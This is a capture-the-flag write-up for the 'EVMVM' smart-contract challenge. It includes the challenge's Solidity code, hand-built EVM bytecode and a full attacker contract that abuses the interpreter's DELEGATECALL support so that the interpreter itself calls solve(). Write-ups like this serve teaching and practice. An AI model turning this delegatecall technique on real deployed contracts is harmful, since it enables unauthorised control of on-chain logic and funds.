# EVMVM [7 solves] [497 points] [First Blood 🩸]

### Description
```
All these zoomers with their "metaverse" or something are thinking far too primitive. If the red pill goes down the rabbit hole, then how far up can we go?

nc lac.tf 31151
```

This is a great and challenging challenge, I learned so much about the EVM at a low level while solving this challenge, such as writing EVM bytecode by hand

The objective is to call `Setup.sol` on behalf of `EVMVM.sol`

### Setup.sol :
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import "./EVMVM.sol";

contract Setup {
    EVMVM public immutable metametaverse = new EVMVM();
    bool private solved = false;

    function solve() external {
        assert(msg.sender == address(metametaverse));
        solved = true;
    }

    function isSolved() external view returns (bool) {
        return solved;
    }
}
```

### EVMVM.sol :
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

// YES I FINALLY GOT MY METAMETAVERSE TO WORK - Arc'blroth
contract EVMVM {
    uint[] private stack;

    // executes a single opcode on the metametaverse™
    // TODO(arc) implement the last few opcodes
    function enterTheMetametaverse(bytes32 opcode, bytes32 arg) external {
        assembly {
            // declare yul bindings for the stack
            // apparently you can only call yul functions from yul :sob:
            // https://ethereum.stackexchange.com/questions/126609/calling-functions-using-inline-assembly-yul

            function spush(data) {
                let index := sload(0x00)
                let stackSlot := 0x00
                sstore(add(keccak256(stackSlot, 0x20), index), data)
                sstore(0x00, add(index, 1))
            }

            function spop() -> out {
                let index := sub(sload(0x00), 1)
                let stackSlot := 0x00
                out := sload(add(keccak256(stackSlot, 0x20), index))
                sstore(add(keccak256(stackSlot, 0x20), index), 0) // zero out the popped memory
                sstore(0x00, index)
            }

            // opcode reference: https://www.evm.codes/?fork=merge
            switch opcode
                case 0x00 { // STOP
                    // lmfao you literally just wasted gas
                }
                case 0x01 { // ADD
                    spush(add(spop(), spop()))
                }
                case 0x02 { // MUL
                    spush(mul(spop(), spop()))
                }
                case 0x03 { // SUB
                    spush(sub(spop(), spop()))
                }
                case 0x04 { // DIV
                    spush(div(spop(), spop()))
                }
                case 0x05 { // SDIV
                    spush(sdiv(spop(), spop()))
                }
                case 0x06 { // MOD
                    spush(mod(spop(), spop()))
                }
                case 0x07 { // SMOD
                    spush(smod(spop(), spop()))
                }
                case 0x08 { // ADDMOD
                    spush(addmod(spop(), spop(), spop()))
                }
                case 0x09 { // MULMOD
                    spush(mulmod(spop(), spop(), spop()))
                }
                case 0x0A { // EXP
                    spush(exp(spop(), spop()))
                }
                case 0x0B { // SIGNEXTEND
                    spush(signextend(spop(), spop()))
                }
                case 0x10 { // LT
                    spush(lt(spop(), spop()))
                }
                case 0x11 { // GT
                    spush(gt(spop(), spop()))
                }
                case 0x12 { // SLT
                    spush(slt(spop(), spop()))
                }
                case 0x13 { // SGT
                    spush(sgt(spop(), spop()))
                }
                case 0x14 { // EQ
                    spush(eq(spop(), spop()))
                }
                case 0x15 { // ISZERO
                    spush(iszero(spop()))
                }
                case 0x16 { // AND
                    spush(and(spop(), spop()))
                }
                case 0x17 { // OR
                    spush(or(spop(), spop()))
                }
                case 0x18 { // XOR
                    spush(xor(spop(), spop()))
                }
                case 0x19 { // NOT
                    spush(not(spop()))
                }
                case 0x1A { // BYTE
                    spush(byte(spop(), spop()))
                }
                case 0x1B { // SHL
                    spush(shl(spop(), spop()))
                }
                case 0x1C { // SHR
                    spush(shr(spop(), spop()))
                }
                case 0x1D { // SAR
                    spush(sar(spop(), spop()))
                }
                case 0x20 { // SHA3
                    spush(keccak256(spop(), spop()))
                }
                case 0x30 { // ADDRESS
                    spush(address())
                }
                case 0x31 { // BALANCE
                    spush(balance(spop()))
                }
                case 0x32 { // ORIGIN
                    spush(origin())
                }
                case 0x33 { // CALLER
                    spush(caller())
                }
                case 0x34 { // CALLVALUE
                    spush(callvalue())
                }
                case 0x35 { // CALLDATALOAD
                    spush(calldataload(spop()))
                }
                case 0x36 { // CALLDATASIZE
                    spush(calldatasize())
                }
                case 0x37 { // CALLDATACOPY
                    calldatacopy(spop(), spop(), spop())
                }
                case 0x38 { // CODESIZE
                    spush(codesize())
                }
                case 0x3A { // GASPRICE
                    spush(gasprice())
                }
                case 0x3B { // EXTCODESIZE
                    spush(extcodesize(spop()))
                }
                case 0x3C { // EXTCODECOPY
                    extcodecopy(spop(), spop(), spop(), spop())
                }
                case 0x3D { // RETURNDATASIZE
                    spush(returndatasize())
                }
                case 0x3E { // RETURNDATACOPY
                    returndatacopy(spop(), spop(), spop())
                }
                case 0x3F { // EXTCODEHASH
                    spush(extcodehash(spop()))
                }
                case 0x40 { // BLOCKHASH
                    spush(blockhash(spop()))
                }
                case 0x41 { // COINBASE (sponsored opcode)
                    spush(coinbase())
                }
                case 0x42 { // TIMESTAMP
                    spush(timestamp())
                }
                case 0x43 { // NUMBER
                    spush(number())
                }
                case 0x44 { // PREVRANDAO
                    spush(difficulty())
                }
                case 0x45 { // GASLIMIT
                    spush(gaslimit())
                }
                case 0x46 { // CHAINID
                    spush(chainid())
                }
                case 0x47 { // SELBALANCE
                    spush(selfbalance())
                }
                case 0x48 { // BASEFEE
                    spush(basefee())
                }
                case 0x50 { // POP
                    pop(spop())
                }
                case 0x51 { // MLOAD
                    spush(mload(spop()))
                }
                case 0x52 { // MSTORE
                    mstore(spop(), spop())
                }
                case 0x53 { // MSTORE8
                    mstore8(spop(), spop())
                }
                case 0x54 { // SLOAD
                    spush(sload(spop()))
                }
                case 0x55 { // SSTORE
                    sstore(spop(), spop())
                }
                case 0x59 { // MSIZE
                    spush(msize())
                }
                case 0x5A { // GAS
                    spush(gas())
                }
                case 0x80 { // DUP1
                    let val := spop()
                    spush(val)
                    spush(val)
                }
                case 0x91 { // SWAP1
                    let a := spop()
                    let b := spop()
                    spush(a)
                    spush(b)
                }
                case 0xF0 { // CREATE
                    spush(create(spop(), spop(), spop()))
                }
                case 0xF1 { // CALL
                    spush(call(spop(), spop(), spop(), spop(), spop(), spop(), spop()))
                }
                case 0xF2 { // CALLCODE
                    spush(callcode(spop(), spop(), spop(), spop(), spop(), spop(), spop()))
                }
                case 0xF3 { // RETURN
                    return(spop(), spop())
                }
                case 0xF4 { // DELEGATECALL
                    spush(delegatecall(spop(), spop(), spop(), spop(), spop(), spop()))
                }
                case 0xF5 { // CREATE2
                    spush(create2(spop(), spop(), spop(), spop()))
                }
                case 0xFA { // STATICCALL
                    spush(staticcall(spop(), spop(), spop(), spop(), spop(), spop()))
                }
                case 0xFD { // REVERT
                    revert(spop(), spop())
                }
                case 0xFE { // INVALID
                    invalid()
                }
                case 0xFF { // SELFDESTRUCT
                    selfdestruct(spop())
                }
        }
    }

    fallback() payable external {
        revert("sus");
    }

    receive() payable external {
        revert("we are a cashless institution");
    }
}
```

The `enterTheMetametaverse()` function allow us to execute a single opcode in the vm in each function call, and store data on the uint array called `stack` which is a state variable

However unlike the actual EVM, in this vm we can't use the memory at all. Although it did implement the opcodes for the memory (MLOAD/MSTORE/MSTORE8), it's executing a single opcode per function call and only the stack will be saved on the `stack` state variable, the memory will be wiped after each function call and will not be saved in anywhere

Normally to call `solve()` in `Setup.sol`, first we have to store the calldata, which is the function selector of `solve()` (`0x890d6908`) to memory, then passing the memory offset and size for it to the CALL opcode, however that's not possible in this challenge, as each function call only execute a single opcode, it's not possible to store anything on the memory that CALL opcode can retrieve on another function call

So, we can use DELEGATECALL opcode instead, using it to call the `fallback()` function of an attacker contract we deployed, and do everything in our attacker contract instead. With this way we don't have to store anything in the memory for the calldata

But there is another problem, which is we can't push directly to the stack in the vm, although it has the `spush()` function in yul, but we can't call a yul function, and the PUSH opcodes weren't implemented in the vm, we have to find other ways to push data on the stack

As the `enterTheMetametaverse()` function don't have the payable modifier, the value of the message/transaction will always be 0, so we can use CALLVALUE (0x34) opcode to push 0 to the stack, and we can turn it to 1 with ISZERO (0x15), and with DUP1 and ADD opcode, we can increase the value of the stack

For example, to push 0x24 to the stack, we can use this :
```
CALLVALUE
ISZERO
DUP1
ADD
DUP1
SHL
DUP1
ADD
DUP1
ADD
CALLVALUE
ISZERO
DUP1
ADD
DUP1
ADD
ADD

34158001801b8001800134158001800101
```

To push the attacker address to the stack, we can use CALLDATALOAD, `enterTheMetametaverse()` has 2 parameters, the bytes32 `arg` is not used, so we can pass our address there, and push 0x24 to the stack as the offset for CALLDATALOAD, and load the data of `arg` to the stack

For example, to push this address (0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF) to the stack :
```
CALLVALUE
ISZERO
DUP1
ADD
DUP1
SHL
DUP1
ADD
DUP1
ADD
CALLVALUE
ISZERO
DUP1
ADD
DUP1
ADD
ADD
CALLDATALOAD

34158001801b800180013415800180010135
```

As one function call only execute one opcode, so convert the address to bytes32 by padding zeros and pass the address to the bytes32 `arg` argument of `enterTheMetametaverse()` when we are executing CALLDATALOAD
```solidity
 »  bytes32(abi.encode(address(0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF)))
0x000000000000000000000000ffffffffffffffffffffffffffffffffffffffff
```

For the gas for DELEGATECALL, we can just use push something like 0x20000 with this :
```
CALLVALUE
ISZERO
DUP1
SHL
DUP1
SHL
DUP1
SHL
CALLVALUE
ISZERO
DUP1
SHL
DUP1
SHL
DUP1
MUL
MUL

3415801b801b801b3415801b801b800202
```

Or we can just use GAS opcode for the remaining gas, but make sure the gasLimit is much higher when we call DELEGATECALL opcode than when we call GAS, as each transaction only execute one opcode, and GAS and DELEGATECALL is executed on different transaction, the remaining gas when we call DELEGATECALL might be less than the remaining gas when we call GAS

After that I just realize it's much easier to do it on the attacker contract itself, as we don't have to use CALLDATALOAD to load the attacker contract address for the delegate call, we can just use CALLER opcode to pass the attacker contract address to `EVMVM.sol`

This is the bytecode I originally used to solve this challenge
```
CALLVALUE
CALLVALUE
CALLVALUE
CALLVALUE
CALLER
CALLVALUE
ISZERO
DUP1
SHL
DUP1
SHL
DUP1
SHL
CALLVALUE
ISZERO
DUP1
SHL
DUP1
SHL
DUP1
MUL
MUL
DELEGATECALL

34343434333415801b801b801b3415801b801b800202f4
```

However, it doesn't work and revert without a reason, I stuck in here for hours

I also notice some weird behavior of the EVMVM, so I just throw the contract into the remix debugger, and discover that this vm implemented in yul behaves differently compare to the actual EVM

This line in yul has 6 function calls to `spop()`

```
delegatecall(spop(), spop(), spop(), spop(), spop(), spop())
```

DELEGATECALL in EVM should pop the first/top item on the stack, and use it as the first argument (gas)

However in the debugger I found that the `spop()` for the last argument will be executed first

So, the first/top item popped from the stack will be passed as the last argument of DELEGATECALL, thats why it's reverting

To make it work, just push the arguments of DELEGATECALL to the stack in the vm in reverse order

### Attacker contract
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import "./Setup.sol";

contract EVMVM_Exploit {
    // Original bytecode :
    // 34343434333415801b801b801b3415801b801b800202f4
    /*
    CALLVALUE
    CALLVALUE
    CALLVALUE
    CALLVALUE
    CALLER
    CALLVALUE
    ISZERO
    DUP1
    SHL
    DUP1
    SHL
    DUP1
    SHL
    CALLVALUE
    ISZERO
    DUP1
    SHL
    DUP1
    SHL
    DUP1
    MUL
    MUL
    DELEGATECALL
    */
    // Bytecode that push delegatecall arguments to stack in reverse order 
    // (first item popped from stack will be on the last argument in yul)
    // 3415801b801b801b3415801b801b8002023334343434f4
    function exploit() public {
        address evmvm = address(Setup(0x24B9d51522925271457E44Dc1FbCE9CBd3D3f90E).metametaverse());
        // Push arguments for delegatecall to stack in reverse order
        EVMVM(payable(evmvm)).enterTheMetametaverse(bytes32(uint256(0x34)), bytes32(0));
        EVMVM(payable(evmvm)).enterTheMetametaverse(bytes32(uint256(0x15)), bytes32(0));
        EVMVM(payable(evmvm)).enterTheMetametaverse(bytes32(uint256(0x80)), bytes32(0));
        EVMVM(payable(evmvm)).enterTheMetametaverse(bytes32(uint256(0x1b)), bytes32(0));
        EVMVM(payable(evmvm)).enterTheMetametaverse(bytes32(uint256(0x80)), bytes32(0));
        EVMVM(payable(evmvm)).enterTheMetametaverse(bytes32(uint256(0x1b)), bytes32(0));
        EVMVM(payable(evmvm)).enterTheMetametaverse(bytes32(uint256(0x80)), bytes32(0));
        EVMVM(payable(evmvm)).enterTheMetametaverse(bytes32(uint256(0x1b)), bytes32(0));
        EVMVM(payable(evmvm)).enterTheMetametaverse(bytes32(uint256(0x34)), bytes32(0));
        EVMVM(payable(evmvm)).enterTheMetametaverse(bytes32(uint256(0x15)), bytes32(0));
        EVMVM(payable(evmvm)).enterTheMetametaverse(bytes32(uint256(0x80)), bytes32(0));
        EVMVM(payable(evmvm)).enterTheMetametaverse(bytes32(uint256(0x1b)), bytes32(0));
        EVMVM(payable(evmvm)).enterTheMetametaverse(bytes32(uint256(0x80)), bytes32(0));
        EVMVM(payable(evmvm)).enterTheMetametaverse(bytes32(uint256(0x1b)), bytes32(0));
        EVMVM(payable(evmvm)).enterTheMetametaverse(bytes32(uint256(0x80)), bytes32(0));
        EVMVM(payable(evmvm)).enterTheMetametaverse(bytes32(uint256(0x02)), bytes32(0));
        EVMVM(payable(evmvm)).enterTheMetametaverse(bytes32(uint256(0x02)), bytes32(0));
        EVMVM(payable(evmvm)).enterTheMetametaverse(bytes32(uint256(0x33)), bytes32(0));
        EVMVM(payable(evmvm)).enterTheMetametaverse(bytes32(uint256(0x34)), bytes32(0));
        EVMVM(payable(evmvm)).enterTheMetametaverse(bytes32(uint256(0x34)), bytes32(0));
        EVMVM(payable(evmvm)).enterTheMetametaverse(bytes32(uint256(0x34)), bytes32(0));
        EVMVM(payable(evmvm)).enterTheMetametaverse(bytes32(uint256(0x34)), bytes32(0));
        // delegatecall
        EVMVM(payable(evmvm)).enterTheMetametaverse(bytes32(uint256(0xf4)), bytes32(0));
    }

    fallback() external payable {
        Setup(address(0x24B9d51522925271457E44Dc1FbCE9CBd3D3f90E)).solve();
    }
}
```

Then just hardcode the setup contract address, deploy it and call `exploit()`

### Flag
```
lactf{yul_hav3_a_bad_t1me_0n_th3_m3tam3tavers3}
```

![](https://i.imgur.com/NcyUsg2.png)
